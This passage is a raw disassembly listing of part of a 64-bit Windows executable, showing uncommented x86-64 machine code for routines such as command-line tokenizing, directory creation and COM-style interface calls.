   140003371:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003375:	e8 56 57 01 00       	call   0x140018ad0
   14000337a:	eb 10                	jmp    0x14000338c
   14000337c:	48 8b 07             	mov    (%rdi),%rax
   14000337f:	ba 64 00 00 00       	mov    $0x64,%edx
   140003384:	48 8b cf             	mov    %rdi,%rcx
   140003387:	ff 50 38             	call   *0x38(%rax)
   14000338a:	8b d8                	mov    %eax,%ebx
   14000338c:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
   140003390:	e8 d9 09 02 00       	call   0x140023d6e
   140003395:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   140003399:	e8 32 57 01 00       	call   0x140018ad0
   14000339e:	8b c3                	mov    %ebx,%eax
   1400033a0:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   1400033a7:	00 
   1400033a8:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400033ac:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400033b0:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   1400033b4:	4d 8b 63 38          	mov    0x38(%r11),%r12
   1400033b8:	49 8b e3             	mov    %r11,%rsp
   1400033bb:	41 5e                	pop    %r14
   1400033bd:	41 5d                	pop    %r13
   1400033bf:	5d                   	pop    %rbp
   1400033c0:	c3                   	ret
   1400033c1:	cc                   	int3
   1400033c2:	cc                   	int3
   1400033c3:	cc                   	int3
   1400033c4:	40 53                	rex push %rbx
   1400033c6:	48 83 ec 30          	sub    $0x30,%rsp
   1400033ca:	83 64 24 48 00       	andl   $0x0,0x48(%rsp)
   1400033cf:	48 8b d9             	mov    %rcx,%rbx
   1400033d2:	eb 64                	jmp    0x140003438
   1400033d4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400033d9:	48 8b d0             	mov    %rax,%rdx
   1400033dc:	e8 af 60 01 00       	call   0x140019490
   1400033e1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400033e6:	e8 15 39 00 00       	call   0x140006d00
   1400033eb:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400033f0:	e8 c7 2d 00 00       	call   0x1400061bc
   1400033f5:	48 8b d0             	mov    %rax,%rdx
   1400033f8:	48 85 c0             	test   %rax,%rax
   1400033fb:	75 12                	jne    0x14000340f
   1400033fd:	8b 54 24 48          	mov    0x48(%rsp),%edx
   140003401:	48 8d 0d 90 97 02 00 	lea    0x29790(%rip),%rcx        # 0x14002cb98
   140003408:	e8 1b fb ff ff       	call   0x140002f28
   14000340d:	eb 1c                	jmp    0x14000342b
   14000340f:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   140003413:	48 8b 05 7e 97 02 00 	mov    0x2977e(%rip),%rax        # 0x14002cb98
   14000341a:	48 8b 0c c8          	mov    (%rax,%rcx,8),%rcx
   14000341e:	48 83 c1 10          	add    $0x10,%rcx
   140003422:	e8 01 61 01 00       	call   0x140019528
   140003427:	ff 44 24 48          	incl   0x48(%rsp)
   14000342b:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003430:	e8 39 09 02 00       	call   0x140023d6e
   140003435:	48 8b cb             	mov    %rbx,%rcx
   140003438:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   14000343d:	e8 46 30 00 00       	call   0x140006488
   140003442:	48 85 c0             	test   %rax,%rax
   140003445:	75 8d                	jne    0x1400033d4
   140003447:	48 83 c4 30          	add    $0x30,%rsp
   14000344b:	5b                   	pop    %rbx
   14000344c:	c3                   	ret
   14000344d:	cc                   	int3
   14000344e:	cc                   	int3
   14000344f:	cc                   	int3
   140003450:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003455:	55                   	push   %rbp
   140003456:	53                   	push   %rbx
   140003457:	56                   	push   %rsi
   140003458:	57                   	push   %rdi
   140003459:	41 54                	push   %r12
   14000345b:	41 55                	push   %r13
   14000345d:	41 56                	push   %r14
   14000345f:	41 57                	push   %r15
   140003461:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   140003466:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   14000346d:	83 25 ec 96 02 00 f7 	andl   $0xfffffff7,0x296ec(%rip)        # 0x14002cb60
   140003474:	4c 8b f1             	mov    %rcx,%r14
   140003477:	48 8d 0d 42 97 02 00 	lea    0x29742(%rip),%rcx        # 0x14002cbc0
   14000347e:	33 ff                	xor    %edi,%edi
   140003480:	e8 cf de ff ff       	call   0x140001354
   140003485:	84 c0                	test   %al,%al
   140003487:	75 2f                	jne    0x1400034b8
   140003489:	40 38 3d 10 96 02 00 	cmp    %dil,0x29610(%rip)        # 0x14002caa0
   140003490:	75 0c                	jne    0x14000349e
   140003492:	39 3d 0c 96 02 00    	cmp    %edi,0x2960c(%rip)        # 0x14002caa4
   140003498:	44 8d 7f 08          	lea    0x8(%rdi),%r15d
   14000349c:	74 06                	je     0x1400034a4
   14000349e:	41 bf 13 00 00 00    	mov    $0x13,%r15d
   1400034a4:	41 8b d7             	mov    %r15d,%edx
   1400034a7:	33 c9                	xor    %ecx,%ecx
   1400034a9:	e8 d6 8f 00 00       	call   0x14000c484
   1400034ae:	b8 05 40 00 80       	mov    $0x80004005,%eax
   1400034b3:	e9 20 03 00 00       	jmp    0x1400037d8
   1400034b8:	83 3d 7d 98 02 00 02 	cmpl   $0x2,0x2987d(%rip)        # 0x14002cd3c
   1400034bf:	74 0c                	je     0x1400034cd
   1400034c1:	49 8b 0e             	mov    (%r14),%rcx
   1400034c4:	e8 bb 23 00 00       	call   0x140005884
   1400034c9:	85 c0                	test   %eax,%eax
   1400034cb:	74 e1                	je     0x1400034ae
   1400034cd:	b9 70 00 00 00       	mov    $0x70,%ecx
   1400034d2:	e8 a3 08 02 00       	call   0x140023d7a
   1400034d7:	48 8b f0             	mov    %rax,%rsi
   1400034da:	48 89 45 bf          	mov    %rax,-0x41(%rbp)
   1400034de:	48 85 c0             	test   %rax,%rax
   1400034e1:	74 3b                	je     0x14000351e
   1400034e3:	89 78 10             	mov    %edi,0x10(%rax)
   1400034e6:	48 8d 05 f3 2c 02 00 	lea    0x22cf3(%rip),%rax        # 0x1400261e0
   1400034ed:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1400034f1:	48 89 06             	mov    %rax,(%rsi)
   1400034f4:	48 8d 05 bd 2c 02 00 	lea    0x22cbd(%rip),%rax        # 0x1400261b8
   1400034fb:	48 89 46 08          	mov    %rax,0x8(%rsi)
   1400034ff:	e8 54 5f 01 00       	call   0x140019458
   140003504:	48 8d 4e 40          	lea    0x40(%rsi),%rcx
   140003508:	48 89 7e 38          	mov    %rdi,0x38(%rsi)
   14000350c:	e8 47 5f 01 00       	call   0x140019458
   140003511:	48 89 7e 30          	mov    %rdi,0x30(%rsi)
   140003515:	48 89 7e 50          	mov    %rdi,0x50(%rsi)
   140003519:	89 7e 58             	mov    %edi,0x58(%rsi)
   14000351c:	eb 07                	jmp    0x140003525
   14000351e:	48 8b f7             	mov    %rdi,%rsi
   140003521:	48 89 7d bf          	mov    %rdi,-0x41(%rbp)
   140003525:	4c 8d 25 f4 2a 02 00 	lea    0x22af4(%rip),%r12        # 0x140026020
   14000352c:	49 8b cc             	mov    %r12,%rcx
   14000352f:	e8 90 fe ff ff       	call   0x1400033c4
   140003534:	4c 8d 2d 0d 2b 02 00 	lea    0x22b0d(%rip),%r13        # 0x140026048
   14000353b:	49 8b cd             	mov    %r13,%rcx
   14000353e:	e8 81 fe ff ff       	call   0x1400033c4
   140003543:	f6 05 16 96 02 00 20 	testb  $0x20,0x29616(%rip)        # 0x14002cb60
   14000354a:	49 8b dc             	mov    %r12,%rbx
   14000354d:	48 89 5d b7          	mov    %rbx,-0x49(%rbp)
   140003551:	4c 89 6d 6f          	mov    %r13,0x6f(%rbp)
   140003555:	74 0b                	je     0x140003562
   140003557:	49 8b dd             	mov    %r13,%rbx
   14000355a:	4c 89 65 6f          	mov    %r12,0x6f(%rbp)
   14000355e:	48 89 5d b7          	mov    %rbx,-0x49(%rbp)
   140003562:	33 d2                	xor    %edx,%edx
   140003564:	48 8b cb             	mov    %rbx,%rcx
   140003567:	e8 1c 2f 00 00       	call   0x140006488
   14000356c:	48 85 c0             	test   %rax,%rax
   14000356f:	75 50                	jne    0x1400035c1
   140003571:	48 8d 4d f7          	lea    -0x9(%rbp),%rcx
   140003575:	e8 de 5e 01 00       	call   0x140019458
   14000357a:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   14000357e:	e8 d5 5e 01 00       	call   0x140019458
   140003583:	48 8d 4d f7          	lea    -0x9(%rbp),%rcx
   140003587:	48 8b d3             	mov    %rbx,%rdx
   14000358a:	e8 99 5f 01 00       	call   0x140019528
   14000358f:	48 8d 15 ca 2c 02 00 	lea    0x22cca(%rip),%rdx        # 0x140026260
   140003596:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   14000359a:	e8 89 5f 01 00       	call   0x140019528
   14000359f:	48 8d 55 f7          	lea    -0x9(%rbp),%rdx
   1400035a3:	48 8d 0d ee 95 02 00 	lea    0x295ee(%rip),%rcx        # 0x14002cb98
   1400035aa:	e8 09 f9 ff ff       	call   0x140002eb8
   1400035af:	48 8b 4d 07          	mov    0x7(%rbp),%rcx
   1400035b3:	e8 b6 07 02 00       	call   0x140023d6e
   1400035b8:	48 8b 4d f7          	mov    -0x9(%rbp),%rcx
   1400035bc:	e8 ad 07 02 00       	call   0x140023d6e
   1400035c1:	48 8d 0d f8 95 02 00 	lea    0x295f8(%rip),%rcx        # 0x14002cbc0
   1400035c8:	e8 43 dc ff ff       	call   0x140001210
   1400035cd:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400035d4:	44 8b f8             	mov    %eax,%r15d
   1400035d7:	b8 04 00 00 00       	mov    $0x4,%eax
   1400035dc:	44 89 7d 77          	mov    %r15d,0x77(%rbp)
   1400035e0:	49 f7 e7             	mul    %r15
   1400035e3:	48 0f 40 c1          	cmovo  %rcx,%rax
   1400035e7:	48 8b c8             	mov    %rax,%rcx
   1400035ea:	e8 8b 07 02 00       	call   0x140023d7a
   1400035ef:	44 8b e7             	mov    %edi,%r12d
   1400035f2:	44 8b ef             	mov    %edi,%r13d
   1400035f5:	48 8b d8             	mov    %rax,%rbx
   1400035f8:	48 89 45 7f          	mov    %rax,0x7f(%rbp)
   1400035fc:	45 85 ff             	test   %r15d,%r15d
   1400035ff:	0f 84 af 01 00 00    	je     0x1400037b4
   140003605:	48 8b 75 6f          	mov    0x6f(%rbp),%rsi
   140003609:	41 bf 08 00 00 00    	mov    $0x8,%r15d
   14000360f:	48 8b 0d ba 95 02 00 	mov    0x295ba(%rip),%rcx        # 0x14002cbd0
   140003616:	89 7d f7             	mov    %edi,-0x9(%rbp)
   140003619:	48 89 7d ff          	mov    %rdi,-0x1(%rbp)
   14000361d:	48 8b 01             	mov    (%rcx),%rax
   140003620:	4c 8d 4d f7          	lea    -0x9(%rbp),%r9
   140003624:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000362a:	41 8b d5             	mov    %r13d,%edx
   14000362d:	ff 50 30             	call   *0x30(%rax)
   140003630:	85 c0                	test   %eax,%eax
   140003632:	0f 85 5e 01 00 00    	jne    0x140003796
   140003638:	66 44 39 7d f7       	cmp    %r15w,-0x9(%rbp)
   14000363d:	0f 85 53 01 00 00    	jne    0x140003796
   140003643:	48 8b 55 ff          	mov    -0x1(%rbp),%rdx
   140003647:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   14000364b:	e8 40 5e 01 00       	call   0x140019490
   140003650:	49 63 c4             	movslq %r12d,%rax
   140003653:	44 8b f7             	mov    %edi,%r14d
   140003656:	4c 8d 3c 83          	lea    (%rbx,%rax,4),%r15
   14000365a:	89 7d 6f             	mov    %edi,0x6f(%rbp)
   14000365d:	48 8d 55 6f          	lea    0x6f(%rbp),%rdx
   140003661:	48 8b ce             	mov    %rsi,%rcx
   140003664:	e8 1f 2e 00 00       	call   0x140006488
   140003669:	48 85 c0             	test   %rax,%rax
   14000366c:	74 52                	je     0x1400036c0
   14000366e:	ff 45 6f             	incl   0x6f(%rbp)
   140003671:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140003675:	48 8b d0             	mov    %rax,%rdx
   140003678:	e8 13 5e 01 00       	call   0x140019490
   14000367d:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   140003681:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140003685:	e8 46 65 01 00       	call   0x140019bd0
   14000368a:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   14000368e:	84 c0                	test   %al,%al
   140003690:	0f 95 c3             	setne  %bl
   140003693:	e8 d6 06 02 00       	call   0x140023d6e
   140003698:	84 db                	test   %bl,%bl
   14000369a:	74 1f                	je     0x1400036bb
   14000369c:	48 8b d6             	mov    %rsi,%rdx
   14000369f:	41 8b cd             	mov    %r13d,%ecx
   1400036a2:	e8 dd f3 ff ff       	call   0x140002a84
   1400036a7:	85 c0                	test   %eax,%eax
   1400036a9:	74 0a                	je     0x1400036b5
   1400036ab:	45 89 2f             	mov    %r13d,(%r15)
   1400036ae:	41 ff c4             	inc    %r12d
   1400036b1:	49 83 c7 04          	add    $0x4,%r15
   1400036b5:	41 be 01 00 00 00    	mov    $0x1,%r14d
   1400036bb:	45 85 f6             	test   %r14d,%r14d
   1400036be:	74 9d                	je     0x14000365d
   1400036c0:	89 7d 6f             	mov    %edi,0x6f(%rbp)
   1400036c3:	49 63 c4             	movslq %r12d,%rax
   1400036c6:	41 bf 08 00 00 00    	mov    $0x8,%r15d
   1400036cc:	45 85 f6             	test   %r14d,%r14d
   1400036cf:	0f 85 b4 00 00 00    	jne    0x140003789
   1400036d5:	48 8b 4d 7f          	mov    0x7f(%rbp),%rcx
   1400036d9:	48 8b 5d b7          	mov    -0x49(%rbp),%rbx
   1400036dd:	4c 8d 3c 81          	lea    (%rcx,%rax,4),%r15
   1400036e1:	48 8d 55 6f          	lea    0x6f(%rbp),%rdx
   1400036e5:	48 8b cb             	mov    %rbx,%rcx
   1400036e8:	e8 9b 2d 00 00       	call   0x140006488
   1400036ed:	48 85 c0             	test   %rax,%rax
   1400036f0:	74 56                	je     0x140003748
   1400036f2:	ff 45 6f             	incl   0x6f(%rbp)
   1400036f5:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   1400036f9:	48 8b d0             	mov    %rax,%rdx
   1400036fc:	e8 8f 5d 01 00       	call   0x140019490
   140003701:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   140003705:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   140003709:	e8 c2 64 01 00       	call   0x140019bd0
   14000370e:	48 8b 4d e7          	mov    -0x19(%rbp),%rcx
   140003712:	84 c0                	test   %al,%al
   140003714:	0f 95 c3             	setne  %bl
   140003717:	e8 52 06 02 00       	call   0x140023d6e
   14000371c:	84 db                	test   %bl,%bl
   14000371e:	48 8b 5d b7          	mov    -0x49(%rbp),%rbx
   140003722:	74 1f                	je     0x140003743
   140003724:	48 8b d3             	mov    %rbx,%rdx
   140003727:	41 8b cd             	mov    %r13d,%ecx
   14000372a:	e8 55 f3 ff ff       	call   0x140002a84
   14000372f:	85 c0                	test   %eax,%eax
   140003731:	74 0a                	je     0x14000373d
   140003733:	45 89 2f             	mov    %r13d,(%r15)
   140003736:	41 ff c4             	inc    %r12d
   140003739:	49 83 c7 04          	add    $0x4,%r15
   14000373d:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140003743:	45 85 f6             	test   %r14d,%r14d
   140003746:	74 99                	je     0x1400036e1
   140003748:	41 bf 08 00 00 00    	mov    $0x8,%r15d
   14000374e:	45 85 f6             	test   %r14d,%r14d
   140003751:	75 36                	jne    0x140003789
   140003753:	48 8d 15 ee 28 02 00 	lea    0x228ee(%rip),%rdx        # 0x140026048
   14000375a:	48 8b cb             	mov    %rbx,%rcx
   14000375d:	e8 6e 54 01 00       	call   0x140018bd0
   140003762:	85 c0                	test   %eax,%eax
   140003764:	75 23                	jne    0x140003789
   140003766:	48 8d 15 b3 28 02 00 	lea    0x228b3(%rip),%rdx        # 0x140026020
   14000376d:	41 8b cd             	mov    %r13d,%ecx
   140003770:	e8 0f f3 ff ff       	call   0x140002a84
   140003775:	48 8b 5d 7f          	mov    0x7f(%rbp),%rbx
   140003779:	85 c0                	test   %eax,%eax
   14000377b:	74 10                	je     0x14000378d
   14000377d:	41 8b c4             	mov    %r12d,%eax
   140003780:	41 ff c4             	inc    %r12d
   140003783:	44 89 2c 83          	mov    %r13d,(%rbx,%rax,4)
   140003787:	eb 04                	jmp    0x14000378d
   140003789:	48 8b 5d 7f          	mov    0x7f(%rbp),%rbx
   14000378d:	48 8b 4d c7          	mov    -0x39(%rbp),%rcx
   140003791:	e8 d8 05 02 00       	call   0x140023d6e
   140003796:	48 8d 4d f7          	lea    -0x9(%rbp),%rcx
   14000379a:	e8 31 53 01 00       	call   0x140018ad0
   14000379f:	41 ff c5             	inc    %r13d
   1400037a2:	44 3b 6d 77          	cmp    0x77(%rbp),%r13d
   1400037a6:	0f 82 63 fe ff ff    	jb     0x14000360f
   1400037ac:	48 8b 75 bf          	mov    -0x41(%rbp),%rsi
   1400037b0:	4c 8b 75 67          	mov    0x67(%rbp),%r14
   1400037b4:	48 89 5e 50          	mov    %rbx,0x50(%rsi)
   1400037b8:	44 89 66 58          	mov    %r12d,0x58(%rsi)
   1400037bc:	45 85 e4             	test   %r12d,%r12d
   1400037bf:	74 0d                	je     0x1400037ce
   1400037c1:	49 8b 16             	mov    (%r14),%rdx
   1400037c4:	48 8b ce             	mov    %rsi,%rcx
   1400037c7:	e8 58 f5 ff ff       	call   0x140002d24
   1400037cc:	8b f8                	mov    %eax,%edi
   1400037ce:	48 8b cb             	mov    %rbx,%rcx
   1400037d1:	e8 98 05 02 00       	call   0x140023d6e
   1400037d6:	8b c7                	mov    %edi,%eax
   1400037d8:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400037df:	41 5f                	pop    %r15
   1400037e1:	41 5e                	pop    %r14
   1400037e3:	41 5d                	pop    %r13
   1400037e5:	41 5c                	pop    %r12
   1400037e7:	5f                   	pop    %rdi
   1400037e8:	5e                   	pop    %rsi
   1400037e9:	5b                   	pop    %rbx
   1400037ea:	5d                   	pop    %rbp
   1400037eb:	c3                   	ret
   1400037ec:	48 83 e9 08          	sub    $0x8,%rcx
   1400037f0:	e9 ab f7 ff ff       	jmp    0x140002fa0
   1400037f5:	cc                   	int3
   1400037f6:	cc                   	int3
   1400037f7:	cc                   	int3
   1400037f8:	40 53                	rex push %rbx
   1400037fa:	48 83 ec 20          	sub    $0x20,%rsp
   1400037fe:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   140003802:	48 8d 05 5f 2a 02 00 	lea    0x22a5f(%rip),%rax        # 0x140026268
   140003809:	48 8b d9             	mov    %rcx,%rbx
   14000380c:	48 89 01             	mov    %rax,(%rcx)
   14000380f:	74 0a                	je     0x14000381b
   140003811:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003815:	ff 15 9d 1a 02 00    	call   *0x21a9d(%rip)        # 0x1400252b8
   14000381b:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000381f:	48 83 c4 20          	add    $0x20,%rsp
   140003823:	5b                   	pop    %rbx
   140003824:	e9 45 05 02 00       	jmp    0x140023d6e
   140003829:	cc                   	int3
   14000382a:	cc                   	int3
   14000382b:	cc                   	int3
   14000382c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003831:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003836:	57                   	push   %rdi
   140003837:	48 83 ec 20          	sub    $0x20,%rsp
   14000383b:	48 8b d9             	mov    %rcx,%rbx
   14000383e:	48 8b ca             	mov    %rdx,%rcx
   140003841:	48 8b f2             	mov    %rdx,%rsi
   140003844:	ff 15 be 1a 02 00    	call   *0x21abe(%rip)        # 0x140025308
   14000384a:	48 8b cb             	mov    %rbx,%rcx
   14000384d:	48 63 f8             	movslq %eax,%rdi
   140003850:	ff 15 b2 1a 02 00    	call   *0x21ab2(%rip)        # 0x140025308
   140003856:	3b c7                	cmp    %edi,%eax
   140003858:	7c 19                	jl     0x140003873
   14000385a:	4c 8b c7             	mov    %rdi,%r8
   14000385d:	48 8b d6             	mov    %rsi,%rdx
   140003860:	48 8b cb             	mov    %rbx,%rcx
   140003863:	ff 15 df 1d 02 00    	call   *0x21ddf(%rip)        # 0x140025648
   140003869:	85 c0                	test   %eax,%eax
   14000386b:	75 06                	jne    0x140003873
   14000386d:	48 8d 04 7b          	lea    (%rbx,%rdi,2),%rax
   140003871:	eb 02                	jmp    0x140003875
   140003873:	33 c0                	xor    %eax,%eax
   140003875:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000387a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000387f:	48 83 c4 20          	add    $0x20,%rsp
   140003883:	5f                   	pop    %rdi
   140003884:	c3                   	ret
   140003885:	cc                   	int3
   140003886:	cc                   	int3
   140003887:	cc                   	int3
   140003888:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000388d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003892:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003897:	57                   	push   %rdi
   140003898:	48 83 ec 20          	sub    $0x20,%rsp
   14000389c:	0f b7 29             	movzwl (%rcx),%ebp
   14000389f:	33 ff                	xor    %edi,%edi
   1400038a1:	48 8b f2             	mov    %rdx,%rsi
   1400038a4:	48 8b d9             	mov    %rcx,%rbx
   1400038a7:	66 83 fd 22          	cmp    $0x22,%bp
   1400038ab:	75 4e                	jne    0x1400038fb
   1400038ad:	48 83 c3 02          	add    $0x2,%rbx
   1400038b1:	0f b7 2b             	movzwl (%rbx),%ebp
   1400038b4:	66 85 ed             	test   %bp,%bp
   1400038b7:	0f 84 8e 00 00 00    	je     0x14000394b
   1400038bd:	66 83 fd 22          	cmp    $0x22,%bp
   1400038c1:	74 31                	je     0x1400038f4
   1400038c3:	8b 46 08             	mov    0x8(%rsi),%eax
   1400038c6:	39 46 0c             	cmp    %eax,0xc(%rsi)
   1400038c9:	75 08                	jne    0x1400038d3
   1400038cb:	48 8b ce             	mov    %rsi,%rcx
   1400038ce:	e8 d9 58 01 00       	call   0x1400191ac
   1400038d3:	8b 56 08             	mov    0x8(%rsi),%edx
   1400038d6:	48 8b 0e             	mov    (%rsi),%rcx
   1400038d9:	48 83 c3 02          	add    $0x2,%rbx
   1400038dd:	66 89 2c 51          	mov    %bp,(%rcx,%rdx,2)
   1400038e1:	ff c2                	inc    %edx
   1400038e3:	66 89 3c 51          	mov    %di,(%rcx,%rdx,2)
   1400038e7:	89 56 08             	mov    %edx,0x8(%rsi)
   1400038ea:	0f b7 2b             	movzwl (%rbx),%ebp
   1400038ed:	8b c2                	mov    %edx,%eax
   1400038ef:	66 85 ed             	test   %bp,%bp
   1400038f2:	75 c9                	jne    0x1400038bd
   1400038f4:	66 39 3b             	cmp    %di,(%rbx)
   1400038f7:	74 52                	je     0x14000394b
   1400038f9:	eb 44                	jmp    0x14000393f
   1400038fb:	66 85 ed             	test   %bp,%bp
   1400038fe:	74 4b                	je     0x14000394b
   140003900:	66 83 fd 20          	cmp    $0x20,%bp
   140003904:	76 3d                	jbe    0x140003943
   140003906:	8b 46 08             	mov    0x8(%rsi),%eax
   140003909:	39 46 0c             	cmp    %eax,0xc(%rsi)
   14000390c:	75 08                	jne    0x140003916
   14000390e:	48 8b ce             	mov    %rsi,%rcx
   140003911:	e8 96 58 01 00       	call   0x1400191ac
   140003916:	8b 56 08             	mov    0x8(%rsi),%edx
   140003919:	48 8b 0e             	mov    (%rsi),%rcx
   14000391c:	48 83 c3 02          	add    $0x2,%rbx
   140003920:	66 89 2c 51          	mov    %bp,(%rcx,%rdx,2)
   140003924:	ff c2                	inc    %edx
   140003926:	66 89 3c 51          	mov    %di,(%rcx,%rdx,2)
   14000392a:	89 56 08             	mov    %edx,0x8(%rsi)
   14000392d:	0f b7 2b             	movzwl (%rbx),%ebp
   140003930:	8b c2                	mov    %edx,%eax
   140003932:	66 85 ed             	test   %bp,%bp
   140003935:	75 c9                	jne    0x140003900
   140003937:	eb 0a                	jmp    0x140003943
   140003939:	66 83 f8 20          	cmp    $0x20,%ax
   14000393d:	77 0c                	ja     0x14000394b
   14000393f:	48 83 c3 02          	add    $0x2,%rbx
   140003943:	0f b7 03             	movzwl (%rbx),%eax
   140003946:	66 85 c0             	test   %ax,%ax
   140003949:	75 ee                	jne    0x140003939
   14000394b:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003950:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003955:	48 8b c3             	mov    %rbx,%rax
   140003958:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000395d:	48 83 c4 20          	add    $0x20,%rsp
   140003961:	5f                   	pop    %rdi
   140003962:	c3                   	ret
   140003963:	cc                   	int3
   140003964:	40 53                	rex push %rbx
   140003966:	48 83 ec 20          	sub    $0x20,%rsp
   14000396a:	33 d2                	xor    %edx,%edx
   14000396c:	48 8b d9             	mov    %rcx,%rbx
   14000396f:	ff 15 33 19 02 00    	call   *0x21933(%rip)        # 0x1400252a8
   140003975:	85 c0                	test   %eax,%eax
   140003977:	75 32                	jne    0x1400039ab
   140003979:	ff 15 f9 19 02 00    	call   *0x219f9(%rip)        # 0x140025378
   14000397f:	3d b7 00 00 00       	cmp    $0xb7,%eax
   140003984:	74 0c                	je     0x140003992
   140003986:	8b c8                	mov    %eax,%ecx
   140003988:	ff 15 6a 19 02 00    	call   *0x2196a(%rip)        # 0x1400252f8
   14000398e:	33 c0                	xor    %eax,%eax
   140003990:	eb 1e                	jmp    0x1400039b0
   140003992:	48 8b cb             	mov    %rbx,%rcx
   140003995:	ff 15 15 19 02 00    	call   *0x21915(%rip)        # 0x1400252b0
   14000399b:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000399e:	74 0b                	je     0x1400039ab
   1400039a0:	a8 10                	test   $0x10,%al
   1400039a2:	75 07                	jne    0x1400039ab
   1400039a4:	b9 b7 00 00 00       	mov    $0xb7,%ecx
   1400039a9:	eb dd                	jmp    0x140003988
   1400039ab:	b8 01 00 00 00       	mov    $0x1,%eax
   1400039b0:	48 83 c4 20          	add    $0x20,%rsp
   1400039b4:	5b                   	pop    %rbx
   1400039b5:	c3                   	ret
   1400039b6:	cc                   	int3
   1400039b7:	cc                   	int3
   1400039b8:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400039bd:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400039c2:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400039c7:	53                   	push   %rbx
   1400039c8:	55                   	push   %rbp
   1400039c9:	56                   	push   %rsi
   1400039ca:	57                   	push   %rdi
   1400039cb:	41 54                	push   %r12
   1400039cd:	41 55                	push   %r13
   1400039cf:	41 56                	push   %r14
   1400039d1:	41 57                	push   %r15
   1400039d3:	b8 38 10 00 00       	mov    $0x1038,%eax
   1400039d8:	e8 b3 0a 02 00       	call   0x140024490
   1400039dd:	48 2b e0             	sub    %rax,%rsp
   1400039e0:	48 8b 01             	mov    (%rcx),%rax
   1400039e3:	49 8b e9             	mov    %r9,%rbp
   1400039e6:	49 8b f8             	mov    %r8,%rdi
   1400039e9:	4c 8b e2             	mov    %rdx,%r12
   1400039ec:	45 33 c9             	xor    %r9d,%r9d
   1400039ef:	45 33 c0             	xor    %r8d,%r8d
   1400039f2:	33 d2                	xor    %edx,%edx
   1400039f4:	48 8b f1             	mov    %rcx,%rsi
   1400039f7:	ff 50 20             	call   *0x20(%rax)
   1400039fa:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400039fe:	33 db                	xor    %ebx,%ebx
   140003a00:	89 5d 08             	mov    %ebx,0x8(%rbp)
   140003a03:	49 8b cc             	mov    %r12,%rcx
   140003a06:	88 18                	mov    %bl,(%rax)
   140003a08:	ff 15 92 18 02 00    	call   *0x21892(%rip)        # 0x1400252a0
   140003a0e:	48 8b cf             	mov    %rdi,%rcx
   140003a11:	4c 63 f0             	movslq %eax,%r14
   140003a14:	ff 15 86 18 02 00    	call   *0x21886(%rip)        # 0x1400252a0
   140003a1a:	44 8b e3             	mov    %ebx,%r12d
   140003a1d:	44 8a fb             	mov    %bl,%r15b
   140003a20:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140003a25:	8b fb                	mov    %ebx,%edi
   140003a27:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003a2b:	48 8b 06             	mov    (%rsi),%rax
   140003a2e:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003a34:	48 8d 54 3c 30       	lea    0x30(%rsp,%rdi,1),%rdx
   140003a39:	4c 8d 8c 24 98 10 00 	lea    0x1098(%rsp),%r9
   140003a40:	00 
   140003a41:	45 2b c4             	sub    %r12d,%r8d
   140003a44:	48 8b ce             	mov    %rsi,%rcx
   140003a47:	4d 8b ee             	mov    %r14,%r13
   140003a4a:	ff 50 18             	call   *0x18(%rax)
   140003a4d:	85 c0                	test   %eax,%eax
   140003a4f:	0f 85 0c 01 00 00    	jne    0x140003b61
   140003a55:	8b 84 24 98 10 00 00 	mov    0x1098(%rsp),%eax
   140003a5c:	85 c0                	test   %eax,%eax
   140003a5e:	0f 84 fd 00 00 00    	je     0x140003b61
   140003a64:	44 03 e0             	add    %eax,%r12d
   140003a67:	8b fb                	mov    %ebx,%edi
   140003a69:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
